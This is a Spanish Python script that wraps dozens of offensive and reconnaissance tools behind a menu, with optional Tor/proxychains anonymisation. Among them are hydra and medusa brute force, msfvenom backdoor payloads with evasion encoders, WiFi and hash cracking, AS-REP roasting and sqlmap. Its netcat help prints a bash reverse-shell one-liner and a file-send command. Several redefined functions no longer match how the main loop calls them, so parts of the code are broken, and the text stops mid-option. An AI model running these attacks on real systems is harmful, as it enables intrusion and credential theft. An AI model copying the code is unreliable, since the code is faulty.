import re
import subprocess
import time
import os

def validar_objetivo(objetivo):
    ip_regex = r"^\d{1,3}(\.\d{1,3}){3}$"
    dominio_regex = r"^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$"
    ipv6_regex = r"^([0-9a-fA-F:]+)$"
    if re.match(ip_regex, objetivo) or re.match(dominio_regex, objetivo) or re.match(ipv6_regex, objetivo):
        return True
    return False
def validar_dominio(dominio):
    dominio_regex = r"^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$"
    return re.match(dominio_regex, dominio)

def ejecutar_comando(comando):
    global usar_proxychains
    if usar_proxychains:
        comando = ["proxychains"] + comando
    print(f"\nEjecutando: {' '.join(comando)}")
    inicio = time.time()
    try:
        resultado = subprocess.run(comando, check=True, capture_output=True, text=True)
        print(resultado.stdout)
        print(f"Escaneo completado en {round(time.time() - inicio, 2)} segundos.")
    except subprocess.CalledProcessError as e:
        print(f"Error al ejecutar el comando: {e}")
        print(e.output)
    except FileNotFoundError:
        print("La herramienta no está instalada o no se encuentra en el PATH.")

def escaneo_basico(target, min_rate, extra="", puertos="", formato="txt"):
    salida = "nmap_result." + formato
    if formato == "xml":
        out_flag = "-oX"
    elif formato == "json":
        out_flag = "-oJ"
    else:
        out_flag = "-oN"
    comando = [
        "nmap", "--open", "--min-rate", str(min_rate),
        "-Pn", "-n", "-vvv", target, out_flag, salida
    ]
    if puertos:
        comando.insert(1, "-p")
        comando.insert(2, puertos)
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_servicios(target, extra="", formato="txt"):
    salida = "nmap_servicios." + formato
    if formato == "xml":
        out_flag = "-oX"
    elif formato == "json":
        out_flag = "-oJ"
    else:
        out_flag = "-oN"
    comando = [
        "nmap", "-sV", "-Pn", "-n", "-vvv", target, out_flag, salida
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_os(target, extra="", formato="txt"):
    salida = "nmap_os." + formato
    if formato == "xml":
        out_flag = "-oX"
    elif formato == "json":
        out_flag = "-oJ"
    else:
        out_flag = "-oN"
    comando = [
        "nmap", "-O", "-Pn", "-n", "-vvv", target, out_flag, salida
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_servicios_C(target, extra="", formato="txt"):
    salida = "nmap_svC." + formato
    if formato == "xml":
        out_flag = "-oX"
    elif formato == "json":
        out_flag = "-oJ"
    else:
        out_flag = "-oN"
    comando = [
        "nmap", "-sV", "--script=default", "-Pn", "-n", "-vvv", target, out_flag, salida
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_agresivo(target, extra="", formato="txt"):
    salida = "nmap_agresivo." + formato
    if formato == "xml":
        out_flag = "-oX"
    elif formato == "json":
        out_flag = "-oJ"
    else:
        out_flag = "-oN"
    comando = [
        "nmap", "-A", "-Pn", "-n", "-vvv", target, out_flag, salida
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_syn(target, extra="", formato="txt"):
    salida = "nmap_syn." + formato
    if formato == "xml":
        out_flag = "-oX"
    elif formato == "json":
        out_flag = "-oJ"
    else:
        out_flag = "-oN"
    comando = [
        "nmap", "-sS", "-Pn", "-n", "-vvv", target, out_flag, salida
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_sigiloso(target, nivel, extra="", formato="txt"):
    salida = f"nmap_sigiloso_T{nivel}." + formato
    if formato == "xml":
        out_flag = "-oX"
    elif formato == "json":
        out_flag = "-oJ"
    else:
        out_flag = "-oN"
    comando = [
        "nmap", "-sS", "-T" + str(nivel), "-Pn", "-n", "-vvv", target, out_flag, salida
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_ipv6(target, extra="", formato="txt"):
    salida = "nmap_ipv6." + formato
    if formato == "xml":
        out_flag = "-oX"
    elif formato == "json":
        out_flag = "-oJ"
    else:
        out_flag = "-oN"
    comando = [
        "nmap", "-6", "-Pn", "-n", "-vvv", target, out_flag, salida
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_nse_personalizado(target, script_nse, extra="", formato="txt"):
    salida = f"nmap_{script_nse}." + formato
    if formato == "xml":
        out_flag = "-oX"
    elif formato == "json":
        out_flag = "-oJ"
    else:
        out_flag = "-oN"
    comando = [
        "nmap", "--script", script_nse, "-Pn", "-n", "-vvv", target, out_flag, salida
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_arp(target, extra="", formato="txt"):
    salida = "nmap_arp." + formato
    if formato == "xml":
        out_flag = "-oX"
    elif formato == "json":
        out_flag = "-oJ"
    else:
        out_flag = "-oN"
    comando = [
        "nmap", "-PR", "-n", "-vvv", target, out_flag, salida
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)
def escaneo_udp(target, extra="", formato="txt"):
    salida = "nmap_udp." + formato
    if formato == "xml":
        out_flag = "-oX"
    elif formato == "json":
        out_flag = "-oJ"
    else:
        out_flag = "-oN"
    comando = [
        "nmap", "-sU", "-Pn", "-n", "-vvv", target, out_flag, salida
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)
def escaneo_syn(target, extra=""):
    comando = [
        "nmap", "-sS", "-Pn", "-n", "-vvv", target, "-oN", "nmap_syn.txt"
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_sigiloso(target, nivel, extra=""):
    comando = [
        "nmap", "-sS", "-T" + str(nivel), "-Pn", "-n", "-vvv", target, "-oN", f"nmap_sigiloso_T{nivel}.txt"
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_ipv6(target, extra=""):
    comando = [
        "nmap", "-6", "-Pn", "-n", "-vvv", target, "-oN", "nmap_ipv6.txt"
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_nse_vuln(target, extra=""):
    comando = [
        "nmap", "--script", "vuln", "-Pn", "-n", "-vvv", target, "-oN", "nmap_vuln.txt"
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_arp(target, extra=""):
    comando = [
        "nmap", "-PR", "-n", "-vvv", target, "-oN", "nmap_arp.txt"
    ]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)
def mostrar_resumen_servicios(archivo_resultado):
    print("\nResumen de servicios encontrados:")
    try:
        with open(archivo_resultado, "r") as f:
            for linea in f:
                if re.match(r"^\d+/tcp\s+open", linea) or re.match(r"^\d+/udp\s+open", linea):
                    print(linea.strip())
    except FileNotFoundError:
        print(f"No se encontró el archivo de resultados: {archivo_resultado}")




def escaneo_nmap_msf(target, extra=""):
    print("Función escaneo_nmap_msf aún no implementada.")

# Elimina la función escaneo_arp duplicada y deja solo una versión.
# Elimina el segundo print en ayuda_android y deja solo uno.

def ayuda_android():
    print("""
Para usar Nmap en Android (Termux):
1. Instala Termux desde Google Play o F-Droid.
2. Instala Nmap con: pkg install nmap
3. Ejecuta los mismos comandos que en Linux.
Ejemplo: nmap -sV 192.168.1.1
""")


def escaneo_dirsearch(target, extra=""):
    comando = ["dirsearch", "-u", target]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)

def escaneo_hydra(target, servicio, usuario, diccionario, hilos):
    comando = [
        "hydra", "-l", usuario, "-P", diccionario, "-t", str(hilos), target, servicio
    ]
    ejecutar_comando(comando)


def escaneo_gobuster(target, wordlist, ext, threads):
    comando = [
        "gobuster", "dir", "-u", target, "-w", wordlist, "-t", str(threads)
    ]
    if ext:
        comando += ["-x", ext]
    ejecutar_comando(comando)

def escaneo_nessus(target):
    print(f"Lanza el escaneo de Nessus manualmente para el objetivo: {target}")
    print("Puedes automatizar esto usando la API REST de Nessus o el CLI cuando lo configures.")


def generar_payload_msfvenom():
    plataforma = input("Plataforma (windows, linux, android, osx, etc.): ").lower()
    tipo_payload = input("Tipo de payload (ejemplo: meterpreter/reverse_tcp): ")
    lhost = input("LHOST (IP atacante): ")
    lport = input("LPORT (puerto atacante): ")
    nombre = input("Nombre de archivo de salida (ejemplo: shell.exe, backdoor.apk): ")

    formato = ""
    if plataforma == "windows":
        formato = "exe"
    elif plataforma == "linux":
        formato = "elf"
    elif plataforma == "android":
        formato = "apk"
    elif plataforma in ["osx", "mac", "macos"]:
        formato = "macho"
    else:
        formato = input("Formato de archivo (ejemplo: exe, elf, apk, macho): ")

    usar_encoder = input("¿Quieres usar encoder? (s/n): ").lower() == "s"
    encoder = ""
    veces = ""
    badchars = ""
    if usar_encoder:
        encoder = input("Nombre del encoder (ejemplo: x86/shikata_ga_nai): ")
        veces = input("¿Cuántas veces aplicar el encoder? (ejemplo: 5): ")
        if not veces.isdigit() or int(veces) < 1:
            veces = "1"
        badchars = input("Badchars (caracteres a evitar, ejemplo: '\\x00\\x0a\\x0d') [deja vacío si no]: ")

    comando = [
        "msfvenom",
        "-p", f"{plataforma}/{tipo_payload}",
        "LHOST=" + lhost,
        "LPORT=" + lport,
        "-f", formato,
        "-o", nombre
    ]
    if usar_encoder:
        comando += ["-e", encoder, "-i", veces]
        if badchars:
            comando += ["-b", badchars]

    print(f"\nEjecutando: {' '.join(comando)}")
    try:
        subprocess.run(comando, check=True)
        print(f"Payload generado: {nombre}")
    except subprocess.CalledProcessError as e:
        print(f"Error al generar el payload: {e}")
def escaneo_nikto(target, extra=""):
    comando = ["nikto", "-h", target]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)
def escaneo_whatweb(target, extra=""):
    comando = ["whatweb", target]
    if extra:
        comando += extra.split()
        ejecutar_comando(comando)
def escaneo_enum4linux(target, extra=""):
    comando = ["enum4linux", "-a", target]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)
def escaneo_openvas(target, extra=""):
    print(f"Lanza el escaneo de OpenVAS manualmente para el objetivo: {target}")
    print("Puedes automatizar esto usando la API o el CLI de OpenVAS cuando lo configures.")
    if extra:
        print(f"Parámetros extra: {extra}")
def escaneo_wfuzz(target, wordlist, extra=""):
    comando = ["wfuzz", "-c", "-w", wordlist, target]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)
def escaneo_ffuf(target, wordlist, ext="", extra=""):
    comando = ["ffuf", "-u", f"{target}/FUZZ", "-w", wordlist]
    if ext:
        comando += ["-e", ext]
    if extra:
        comando += extra.split()
    ejecutar_comando(comando)
def validar_url_fuzz(url):
    return (url.startswith("http://") or url.startswith("https://")) and "FUZZ" in url
def escaneo_searchsploit(servicio):
    salida = f"searchsploit_{servicio.replace(' ', '_')}.txt"
    comando = ["searchsploit", servicio]
    print(f"\nEjecutando: {' '.join(comando)}")
    with open(salida, "w") as f:
        try:
            subprocess.run(comando, check=True, stdout=f)
            print(f"Resultados guardados en: {salida}")
        except subprocess.CalledProcessError as e:
            print(f"Error al ejecutar Searchsploit: {e}")
def escaneo_netcat():
    print("""
Opciones rápidas con Netcat:
1. Probar conectividad a un puerto: nc <IP> <PUERTO>
2. Escuchar en un puerto: nc -lvnp <PUERTO>
3. Enviar un archivo: nc <IP> <PUERTO> < archivo
4. Recibir un archivo: nc -lvnp <PUERTO> > archivo
5. Shell reversa (Linux): bash -i >& /dev/tcp/<IP>/<PUERTO> 0>&1
Puedes ejecutar estos comandos manualmente en otra terminal.
""")
def ejecutar_msfconsole(script_rc):
    comando = ["msfconsole", "-r", script_rc]
    print(f"\nEjecutando: {' '.join(comando)}")
    try:
        subprocess.run(comando, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error al ejecutar Metasploit: {e}")
def escaneo_john(hashfile, wordlist):
    comando = ["john", "--wordlist=" + wordlist, hashfile]
    ejecutar_comando(comando)
    # Mostrar las contraseñas crackeadas
    subprocess.run(["john", "--show", hashfile])
def escaneo_hashcat(hashfile, wordlist, mode):
    comando = ["hashcat", "-m", str(mode), hashfile, wordlist]
    ejecutar_comando(comando)
def escaneo_aircrack(capture_file, wordlist):
    comando = ["aircrack-ng", "-w", wordlist, capture_file]
    ejecutar_comando(comando)
def escaneo_amass(dominio):
    comando = ["amass", "enum", "-d", dominio]
    ejecutar_comando(comando)
def escaneo_sublist3r(dominio):
    comando = ["sublist3r", "-d", dominio]
    ejecutar_comando(comando)
def escaneo_dnsenum(dominio):
    comando = ["dnsenum", dominio]
    ejecutar_comando(comando)
def escaneo_theharvester(dominio, fuente="google", limite="100"):
    comando = ["theHarvester", "-d", dominio, "-b", fuente, "-l", limite]
    ejecutar_comando(comando)
def escaneo_netdiscover(rango="192.168.1.0/24"):
    comando = ["netdiscover", "-r", rango]
    ejecutar_comando(comando)
def escaneo_nuclei(target, template=""):
    comando = ["nuclei", "-u", target]
    if template:
        comando += ["-t", template]
    ejecutar_comando(comando)
def escaneo_cewl(url, profundidad="2", min_long="5", salida="cewl_wordlist.txt"):
    comando = [
        "cewl", url,
        "-d", profundidad,
        "-m", min_long,
        "-w", salida
    ]
    ejecutar_comando(comando)
def escaneo_medusa(target, servicio, usuario, diccionario, hilos="4"):
    comando = [
        "medusa", "-h", target, "-u", usuario, "-P", diccionario, "-M", servicio, "-t", str(hilos)
    ]
    ejecutar_comando(comando)
def escaneo_rustscan(target, puertos="1-65535"):
    comando = ["rustscan", "-a", target, "-r", puertos]
    ejecutar_comando(comando)
def escaneo_impacket_getnpusers(target, usuario, dominio, diccionario=""):
    comando = ["GetNPUsers.py", f"{dominio}/{usuario}", "-dc-ip", target]
    if diccionario:
        comando += ["-outputfile", diccionario]
    ejecutar_comando(comando)
def escaneo_wpscan(url, api_token=""):
    comando = ["wpscan", "--url", url]
    if api_token:
        comando += ["--api-token", api_token]
    ejecutar_comando(comando)
def escaneo_joomscan(url):
    comando = ["joomscan", "--url", url]
    ejecutar_comando(comando)
def escaneo_xsser(url, metodo="GET", parametros=""):
    comando = ["xsser", "-u", url]
    if metodo.upper() == "POST":
        comando += ["--data", parametros]
    ejecutar_comando(comando)
def escaneo_reconng(target, workspace="default"):
    comando = ["recon-ng", "-w", workspace, "-r", target]
    ejecutar_comando(comando)
def escaneo_spiderfoot(target, output="spiderfoot_result.html"):
    comando = [
        "spiderfoot", "-s", target, "-o", "html", "-F", "-o", output
    ]
    ejecutar_comando(comando)
def escaneo_shodan(query, output="shodan_result.txt"):
    comando = ["shodan", "search", query, "--limit", "100"]
    with open(output, "w") as f:
        try:
            subprocess.run(comando, check=True, stdout=f)
            print(f"Resultados guardados en: {output}")
        except subprocess.CalledProcessError as e:
            print(f"Error al ejecutar Shodan: {e}")
def lanzar_maltego():
    comando = ["maltego"]
    print(f"\nEjecutando: {' '.join(comando)}")
    try:
        subprocess.run(comando, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error al ejecutar Maltego: {e}")
def escaneo_ghunt(email, output="ghunt_result.txt"):
    comando = ["python3", "/ruta/a/GHunt/ghunt.py", "email", email]
    with open(output, "w") as f:
        try:
            subprocess.run(comando, check=True, stdout=f)
            print(f"Resultados guardados en: {output}")
        except subprocess.CalledProcessError as e:
            print(f"Error al ejecutar GHunt: {e}")
def escaneo_social_analyzer(usuario, output="social_analyzer_result.json"):
    comando = [
        "python3", "/ruta/a/social-analyzer/social-analyzer.py",
        "-u", usuario,
        "-o", output,
        "-f", "json"
    ]
    try:
        subprocess.run(comando, check=True)
        print(f"Resultados guardados en: {output}")
    except subprocess.CalledProcessError as e:
        print(f"Error al ejecutar Social Analyzer: {e}")
def escaneo_censys(query, output="censys_result.txt"):
    comando = ["censys", "search", "ipv4", query, "--limit", "100"]
    with open(output, "w") as f:
        try:
            subprocess.run(comando, check=True, stdout=f)
            print(f"Resultados guardados en: {output}")
        except subprocess.CalledProcessError as e:
            print(f"Error al ejecutar Censys: {e}")
def escaneo_exiftool(archivo, output="exiftool_result.txt"):
    comando = ["exiftool", archivo]
    with open(output, "w") as f:
        try:
            subprocess.run(comando, check=True, stdout=f)
            print(f"Metadatos extraídos y guardados en: {output}")
        except subprocess.CalledProcessError as e:
            print(f"Error al ejecutar ExifTool: {e}")
def escaneo_sqlmap(url, output="sqlmap_result.txt", extra=""):
    comando = ["sqlmap", "-u", url, "--batch", "-o"]
    if extra:
        comando += extra.split()
    with open(output, "w") as f:
        try:
            subprocess.run(comando, check=True, stdout=f)
            print(f"Resultados guardados en: {output}")
        except subprocess.CalledProcessError as e:
            print(f"Error al ejecutar sqlmap: {e}")
def escaneo_sherlock(usuario, output="sherlock_result.txt"):
    comando = ["python3", "/ruta/a/sherlock/sherlock.py", usuario]
    with open(output, "w") as f:
        try:
            subprocess.run(comando, check=True, stdout=f)
            print(f"Resultados guardados en: {output}")
        except subprocess.CalledProcessError as e:
            print(f"Error al ejecutar Sherlock: {e}")
def mostrar_ayuda():
    print("""
Opciones de escaneo con Nmap y herramientas relacionadas:
1. Escaneo básico (puertos, --open, --min-rate)                                                                                                                                                                                                                                    
2. Escaneo de servicios y versiones (-sV)
3. Detección de sistema operativo (-O)
4. Guardar resultado en XML
5. Guardar resultado en JSON
6. Escaneo de servicios con -sV --script=default
7. Escaneo agresivo (-A)
8. Escaneo SYN sigiloso (-sS)
9. Escaneos sigilosos con T1, T2, T3, T4
10. Escaneo IPv6
11. Escaneo de vulnerabilidades con NSE (--script vuln)
12. Escaneo ARP para MACs (-PR)
13. Ayuda para Nmap en Android
14. Escaneo Nmap y carga en Metasploit (db_import)
15. Escaneo de directorios con Dirsearch
16. Fuerza bruta con Hydra (FTP, SSH, MySQL)
17. Escaneo de directorios y archivos con Gobuster
18. Escaneo de vulnerabilidades con Nessus
19. Generar payloads con msfvenom (Windows, Linux, Android, Mac, etc.)
20. Escaneo con script MSE personalizado
21. Escaneo UDP (-sU)
22. Escaneo de vulnerabilidades web con Nikto
23. Detección de tecnologías con WhatWeb
24. Enumeración de servicios SMB con Enum4linux
25. Escaneo de vulnerabilidades con OpenVAS
26. Fuzzing de directorios y parametros web con Wfuzz (usa FUZZ en la URL)
27. Fuzzing de directorios y archivos web con FFUF
28. Busqueda de exploits locales con Searchsploit
29. Comandos útiles de Netcat
30. Ejecutar Metasploit con script .rc automatizado
31. Cracking de hashes con John the Ripper
32. Cracking de hashes con Hashcat
33. Cracking de WiFi WPA/WPA2 con Aircrack-ng
34. Enumeración de subdominios con amass
35. Enumeración de subdominios con sublist3r
36. Enumeración DNS con dnsenum
37. Recolección de correos y dominios con theHarvester
38. Descubrimiento de hosts en red local con netdiscover
39. Escaneo de vulnerabilidades con nuclei
40. Generador de diccionarios personalizados con cewl
41. Fuerza bruta de servicios con medusa
42. Escaneo de puertos rápido con rustscan
43. Ataques Kerberos AS-REP roasting con impacket (GetNPUsers.py)
44. Escaneo de vulnerabilidades en WordPress con wpscan
45. Escaneo de vulnerabilidades en Joomla con joomscan
46. Detección de XSS en aplicaciones web con xsser
47. Automatización de Recon-ng (ejecutar scripts .rc en workspace)
48. Recolección OSINT automatizada con SpiderFoot
49. Búsqueda OSINT en dispositivos con Shodan
50. Lanzar Maltego para investigaciones OSINT gráficas
51. Recolección OSINT sobre cuentas Google con GHunt
52. Búsqueda OSINT de perfiles en redes sociales con Social Analyzer
53. Búsqueda OSINT en hosts con Censys
54. Extracción de metadatos de archivos con ExifTool (alternativa a FOCA)
55. Automatización de SQL Injection con sqlmap
56. Búsqueda de usuarios en redes sociales con Sherlock
h. Mostrar esta ayuda
""")
if __name__ == "__main__":
    usar_proxychains = input("¿Quieres usar proxychains y Tor para el escaneo? (s/n): ").lower() == "s"
    objetivo = input("Introduce la IP, dominio o IPv6 objetivo: ")
    if not validar_objetivo(objetivo):
        print("Objetivo inválido. Introduce una IP, dominio o IPv6 válido.")
        exit(1)

    while True:
        mostrar_ayuda()
        opcion = input("Elige una opción (1-56, h para ayuda, q para salir): ")
        if opcion.lower() == "q":
            print("Saliendo...")
            break
        extra = input("¿Quieres añadir parámetros extra a Nmap? (deja vacío si no): ")
        if extra.lower() in ["si", "no"]:
            extra = ""

        # Aquí van todos tus bloques de opciones (if/elif)
        if opcion == "1":
            escaneo_basico(objetivo, min_rate=1000, extra=extra, puertos="", formato="txt")
            mostrar_resumen_servicios("nmap_result.txt")
        elif opcion == "2":
            escaneo_servicios(objetivo, extra, "txt")
            mostrar_resumen_servicios("nmap_servicios.txt")
        elif opcion == "3":
            escaneo_os(objetivo, extra, "txt")
            mostrar_resumen_servicios("nmap_os.txt")
        elif opcion == "4":
            escaneo_basico(objetivo, min_rate=1000, extra=extra, puertos="", formato="xml")
        elif opcion == "5":
            escaneo_basico(objetivo, min_rate=1000, extra=extra, puertos="", formato="json")
        elif opcion == "6":
            escaneo_servicios_C(objetivo, extra, "txt")
        elif opcion == "7":
            escaneo_agresivo(objetivo, extra, "txt")
        elif opcion == "8":
            escaneo_syn(objetivo, extra, "txt")
        elif opcion == "9":
            for nivel in range(1, 5):
                escaneo_sigiloso(objetivo, nivel, extra, "txt")
        elif opcion == "10":
            escaneo_ipv6(objetivo, extra, "txt")
        elif opcion == "11":
            escaneo_nse_vuln(objetivo, extra, "txt")
        elif opcion == "12":
            escaneo_arp(objetivo, extra, "txt")
        elif opcion == "13":
            ayuda_android()
        elif opcion == "14":
            escaneo_nmap_msf(objetivo, extra)
        elif opcion == "15":
            escaneo_dirsearch(objetivo, extra)
        elif opcion == "16":
            servicio = input("Servicio a atacar (ejemplo: ftp, ssh, mysql, http, smb, rdp, telnet, vnc, etc.): ")
            usuario = input("Usuario objetivo: ")
            diccionario = input("Ruta al diccionario de contraseñas: ")
            hilos = input("Número de hilos (ejemplo: 4, 8, 16): ")
            if not hilos.isdigit() or int(hilos) < 1:
                hilos = "4"
            escaneo_hydra(objetivo, servicio, usuario, diccionario, hilos)
        elif opcion == "17":
            wordlist = input("Ruta al diccionario de palabras (ejemplo: /usr/share/wordlists/dirb/common.txt): ")
            ext = input("Extensiones a buscar (ejemplo: php,txt) [deja vacío si no]: ")
            threads = input("Número de hilos (ejemplo: 10, 20): ")
            if not threads.isdigit() or int(threads) < 1:
                threads = "10"
            escaneo_gobuster(objetivo, wordlist, ext, threads)
        elif opcion == "18":
            escaneo_nessus(objetivo)
        elif opcion == "19":
            generar_payload_msfvenom()
        elif opcion == "20":
            script_nse = input("Nombre del script NSE a ejecutar (ejemplo: http-enum, ftp-anon, smb-os-discovery): ")
            escaneo_nse_personalizado(objetivo, script_nse, extra, "txt")
        elif opcion == "21":
            escaneo_udp(objetivo, extra, "txt")
            mostrar_resumen_servicios("nmap_udp.txt")
        elif opcion.lower() == "h":
            mostrar_ayuda()
        elif opcion == "22":
            escaneo_nikto(objetivo, extra)
        elif opcion == "23":
            escaneo_whatweb(objetivo, extra)
        elif opcion == "24":
            escaneo_enum4linux(objetivo, extra)
        elif opcion == "25":
            escaneo_openvas(objetivo, extra)
        elif opcion == "26":
            wordlist = input("Ruta al diccionario de palabras (ejemplo: /usr/share/wordlists/dirb/common.txt): ").strip()
            url_fuzz = input("URL objetivo con FUZZ (ejemplo: http://192.168.32.128/FUZZ): ").strip()
            if not os.path.isfile(wordlist):
                print(f"El diccionario '{wordlist}' no existe. Verifica la ruta.")
            elif not validar_url_fuzz(url_fuzz):
                print("La URL debe incluir 'FUZZ' y comenzar con http:// o https://")
            else:
                escaneo_wfuzz(url_fuzz, wordlist, extra)
        elif opcion == "27":
            wordlist = input("Ruta al diccionario de palabras (ejemplo: /usr/share/wordlists/dirb/common.txt): ").strip()
            url_ffuf = input("URL objetivo con FUZZ (ejemplo: http://192.168.32.128/FUZZ): ").strip()
            ext = input("Extensiones a buscar (ejemplo: php,txt) [deja vacío si no]: ")
            if not os.path.isfile(wordlist):
                print(f"El diccionario '{wordlist}' no existe. Verifica la ruta.")
            elif not validar_url_fuzz(url_ffuf):
                print("La URL debe incluir 'FUZZ' y comenzar con http:// o https://")
            else:
                escaneo_ffuf(url_ffuf, wordlist, ext, extra)
        elif opcion == "28":
            servicio = input("Servicio, versión o palabra clave a buscar en Searchsploit: ")
            escaneo_searchsploit(servicio)
        elif opcion == "29":
            escaneo_netcat()
        elif opcion == "30":
            script_rc = input("Ruta al archivo de comandos .rc para Metasploit: ").strip()
            if not os.path.isfile(script_rc):
                print(f"El archivo '{script_rc}' no existe. Verifica la ruta.")
            else:
                ejecutar_msfconsole(script_rc)
        elif opcion == "31":
            hashfile = input("Ruta al archivo de hashes para John the Ripper: ").strip()
            wordlist = input("Ruta al diccionario de palabras: ").strip()
            if not os.path.isfile(hashfile) or not os.path.isfile(wordlist):
                print("Archivo de hashes o diccionario no existe.")
            else:
                escaneo_john(hashfile, wordlist)

        elif opcion == "32":
            hashfile = input("Ruta al archivo de hashes para Hashcat: ").strip()
            wordlist = input("Ruta al diccionario de palabras: ").strip()
            mode = input("Modo de hashcat (-m, ejemplo: 0 para MD5, 1000 para NTLM): ").strip()
            if not os.path.isfile(hashfile) or not os.path.isfile(wordlist):
                print("Archivo de hashes o diccionario no existe.")
            else:
                escaneo_hashcat(hashfile, wordlist, mode)

        elif opcion == "33":
            capture_file = input("Ruta al archivo de captura (.cap) para Aircrack-ng: ").strip()
            wordlist = input("Ruta al diccionario de palabras: ").strip()
            if not os.path.isfile(capture_file) or not os.path.isfile(wordlist):
                print("Archivo de captura o diccionario no existe.")
            else:
                escaneo_aircrack(capture_file, wordlist)

        elif opcion == "34":
            dominio = input("Dominio objetivo para enumerar subdominios con amass: ").strip()
            if not validar_dominio(dominio):
                print("Dominio no válido. Debe ser del tipo ejemplo.com")
            else:
                escaneo_amass(dominio)
        elif opcion == "35":
            dominio = input("Dominio objetivo para enumerar subdominios con sublist3r: ").strip()
            if not validar_dominio(dominio):
                print("Dominio no válido. Debe ser del tipo ejemplo.com")
            else:
                escaneo_sublist3r(dominio)
        elif opcion == "36":
            dominio = input("Dominio objetivo para enumerar DNS con dnsenum: ").strip()
            if not validar_dominio(dominio):
                print("Dominio no válido. Debe ser del tipo ejemplo.com")
            else:
                escaneo_dnsenum(dominio)
        elif opcion == "37":
            dominio = input("Dominio objetivo para recolectar información con theHarvester: ").strip()
            if not validar_dominio(dominio):
                print("Dominio no válido. Debe ser del tipo ejemplo.com")
            else:
                fuente = input("Fuente (google, bing, yahoo, etc.) [por defecto: google]: ").strip() or "google"
                limite = input("Límite de resultados [por defecto: 100]: ").strip() or "100"
                escaneo_theharvester(dominio, fuente, limite)
        elif opcion == "38":
            rango = input("Rango de red para descubrir hosts (ejemplo: 192.168.1.0/24): ").strip()
            escaneo_netdiscover(rango)
        elif opcion == "39":
            target = input("URL o IP objetivo para escanear con nuclei: ").strip()
            template = input("Ruta al template de nuclei (deja vacío para usar los por defecto): ").strip()
            escaneo_nuclei(target, template)
        elif opcion == "40":
            url = input("URL objetivo para generar diccionario con cewl (ejemplo: http://example.com): ").strip()
            profundidad = input("Profundidad de rastreo [por defecto: 2]: ").strip() or "2"
            min_long = input("Longitud mínima de palabras [por defecto: 5]: ").strip() or "5"
            salida = input("Nombre de archivo de salida [por defecto: cewl_wordlist.txt]: ").strip() or "cewl_wordlist.txt"
            escaneo_cewl(url, profundidad, min_long, salida)
        elif opcion == "41":
            target = input("IP o dominio objetivo para fuerza bruta con medusa: ").strip()
            servicio = input("Servicio a atacar (ejemplo: ftp, ssh, mysql, http, smb, rdp, telnet, vnc, etc.): ").strip()
            usuario = input("Usuario objetivo: ").strip()
            diccionario = input("Ruta al diccionario de contraseñas: ").strip()
            hilos = input("Número de hilos [por defecto: 4]: ").strip() or "4"
            if not os.path.isfile(diccionario):
                print(f"El diccionario '{diccionario}' no existe. Verifica la ruta.")
            else:
                escaneo_medusa(target, servicio, usuario, diccionario, hilos)
        elif opcion == "42":
            target = input("IP o dominio objetivo para escanear con rustscan: ").strip()
            puertos = input("Rango de puertos (ejemplo: 1-65535) [por defecto: 1-65535]: ").strip() or "1-65535"
            escaneo_rustscan(target, puertos)
        elif opcion == "43":
            target = input("IP del controlador de dominio (DC): ").strip()
            usuario = input("Usuario objetivo: ").strip()
            dominio = input("Dominio objetivo: ").strip()
            diccionario = input("Archivo de salida (deja vacío si no): ").strip()
            escaneo_impacket_getnpusers(target, usuario, dominio, diccionario)
        elif opcion == "44":
            url = input("URL objetivo para escanear WordPress con wpscan (ejemplo: http://example.com): ").strip()
            api_token = input("API token de wpscan (deja vacío si no tienes): ").strip()
            escaneo_wpscan(url, api_token) 
        elif opcion == "45":
            url = input("URL objetivo para escanear Joomla con joomscan (ejemplo: http://example.com): ").strip()
            escaneo_joomscan(url)
        elif opcion == "46":
            url = input("URL objetivo para escanear XSS con xsser (ejemplo: http://example.com): ").strip()
            metodo = input("Método HTTP (GET/POST) [por defecto: GET]: ").strip() or "GET"
            parametros = ""
            if metodo.upper() == "POST":
                parametros = input("Parámetros POST (ejemplo: usuario=admin&pass=1234): ").strip()
            escaneo_xsser(url, metodo, parametros)
        elif opcion == "47":
            target = input("Script de Recon-ng a ejecutar (ejemplo: script.rc): ").strip()
            workspace = input("Workspace de Recon-ng [por defecto: default]: ").strip() or "default"
            escaneo_reconng(target, workspace)
        elif opcion == "48":
            target = input("Dominio, IP o palabra clave para escanear con SpiderFoot: ").strip()
            output = input("Archivo de salida [por defecto: spiderfoot_result.html]: ").strip() or "spiderfoot_result.html"
            escaneo_spiderfoot(target, output)
        elif opcion == "49":
            query = input("Consulta de búsqueda para Shodan (ejemplo: apache country:ES): ").strip()
            output = input("Archivo de salida [por defecto: shodan_result.txt]: ").strip() or "shodan_result.txt"
            escaneo_shodan(query, output)
        elif opcion == "50":
            print("Maltego se abrirá en modo gráfico. Realiza tus investigaciones OSINT desde la interfaz.")
            lanzar_maltego()
        elif opcion == "51":
            email = input("Correo objetivo para OSINT con GHunt: ").strip()
            output = input("Archivo de salida [por defecto: ghunt_result.txt]: ").strip() or "ghunt_result.txt"
            escaneo_ghunt(email, output)
        elif opcion == "52":
            usuario = input("Usuario, nombre o correo para buscar en redes sociales: ").strip()
